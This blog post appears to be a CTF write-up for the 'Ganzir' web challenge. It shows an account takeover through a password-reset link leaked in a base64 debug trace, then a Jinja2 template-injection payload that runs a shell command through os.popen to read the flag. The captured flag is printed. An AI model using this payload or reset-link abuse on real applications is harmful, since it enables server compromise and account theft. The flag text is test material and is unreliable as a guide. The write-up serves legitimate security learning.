---
layout: post
title:  "Ganzir"
date:   2026-07-21 17:30:00 -0400
author: robo.uzi
tags: [CTF]
permalink: /omni-CTF-2026-Ganzir/
---
* TOC
{:toc}
{% raw %}

Author: codru

Category: Web

Description: Just a normal web app. Go away!!!!

I go the site:

![Alt text](/images/omniweb1.png)

There was no `robots.txt`.

The `/employee` page told me this:
```shell
# Direct Employee Access Denied

The browser entry point is closed until the legacy edge bridge opens an internal Records workstation session.

accepted job endpoint: POST /employee
accepted body formats: raw_request form field or text/plain raw HTTP
edge parser: honors Transfer-Encoding: chunked
bridge parser: trusts Content-Length before forwarding remaining bytes
internal request: GET /employee/session HTTP/1.1
required internal header: X-Employee-Gate: internal
```
This seemed to be a rabbit hole. 

You can login on `/login` but obviously I dont have credentials yet. `/reset` looks like the best bet:

![Alt text](/images/omniweb2.png)

On `view-source:https://ganzir-49c405090584.inst.omnictf.com/reset` I get some useful info:
```html
<script>
  document.getElementById("reset-form").addEventListener("submit", function(event) {
    event.preventDefault();
    const form = new FormData(event.target);
    fetch("/reset", {
      method: "POST",
      body: form,
      headers: {
        "X-Requested-With": "recovery-console"
      }
    }).then((response) => response.json()).then((data) => {
      document.getElementById("reset-status").textContent = data.message + " Relay id: " + data.relay_id;
    });
  });
</script>
```

First I try to reset the password for `admin`:
```shell
curl -X POST https://ganzir-53fca955f838.inst.omnictf.com/reset -H "X-Requested-With: recovery-console" -d "username=admin" -i  
HTTP/2 200  
server: nginx/1.30.0  
date: Fri, 17 Jul 2026 17:14:21 GMT  
content-type: application/json  
content-length: 137  
strict-transport-security: max-age=31536000  
  
{"delivery":"site19-internal-mail","message":"If that account exists, a recovery link has been sent.","ok":true,"relay_id":"Q-B0F0DB45"}
```
Interesting but not super useful. 

On `/login` they mention someone named `cassie`. I try with that username:
```shell
curl -X POST https://ganzir-49c405090584.inst.omnictf.com/reset -H "X-Requested-With: recovery-console" -d "username=cassie" -i                                            
HTTP/2 200  
server: nginx/1.30.0  
date: Fri, 17 Jul 2026 17:29:59 GMT  
content-type: application/json  
content-length: 382  
strict-transport-security: max-age=31536000  
  
{"delivery":"site19-internal-mail","message":"Recovery link sent to c***r@site19.int.","ok":true,"relay_id":"Q-69FEA29E","smtp_trace":"eyJyZWxheSI6IlEtNjlGRUEyOUUiLCJyY3B0IjoiY2Fzc2llLm1lcmNlckBzaXRlMTkuaW50IiwicHJldmlld191cmwiOiJodHRwOi8vZ2FuemlyLTQ5YzQwNTA5MDU4NC5pbnN0Lm9tbmljdGYuY29tL3Jlc2V0L3haODRQLUxkTXJsVHo2bTkzNDdhdE4ybiIsInJldGVudGlvbiI6ImRlYnVnLXByZXZpZXctZW5hYmxlZCJ9"}
```
This looks better!

I decode the `smtp_trace`:
```shell
echo 'eyJyZWxheSI6IlEtNjlGRUEyOUUiLCJyY3B0IjoiY2Fzc2llLm1lcmNlckBzaXRlMTkuaW50IiwicHJldmlld191cmwiOiJodHRwOi8vZ2FuemlyLTQ5YzQwNTA5MDU4NC5pbnN0Lm9tbmljdGYuY29tL3Jlc2V0L3haODRQLUxkTXJsVHo2bTkzNDdhdE4ybiIsInJldGVudGlvbiI6ImRlYnVnLXByZXZpZXctZW5hYmxlZCJ9' | base64 -d  
{"relay":"Q-69FEA29E","rcpt":"cassie.mercer@site19.int","preview_url":"http://ganzir-49c405090584.inst.omnictf.com/reset/xZ84P-LdMrlTz6m9347atN2n","retention":"debug-preview-enabled"}
```

I get the link to reset the password for this account:
```shell
http://ganzir-49c405090584.inst.omnictf.com/reset/xZ84P-LdMrlTz6m9347atN2n
```

Go to the page and reset the password:

![Alt text](/images/omniweb3.png)

After logging in as `cassie` I get access to a lot of new stuff:

![Alt text](/images/omniweb4.png)

I looked through it for a while. Theres a few rabbit holes you could fall down but on `https://ganzir-49c405090584.inst.omnictf.com/briefing-template` I found SSTI:

![Alt text](/images/omniweb5.png)

`engine: Jinja2` and `flag copy: /flag.txt` are a huge give away. 

Confirm SSTI. There seemed to be no regex or blacklist:

![Alt text](/images/omniweb6.png)

Get the flag with:
```shell
{{ config.__class__.__init__.__globals__['os'].popen('cat flag.txt').read() }}
```
The end!

`CTF{ganzir_was_already_in_the_fire_plan}`
{% endraw %}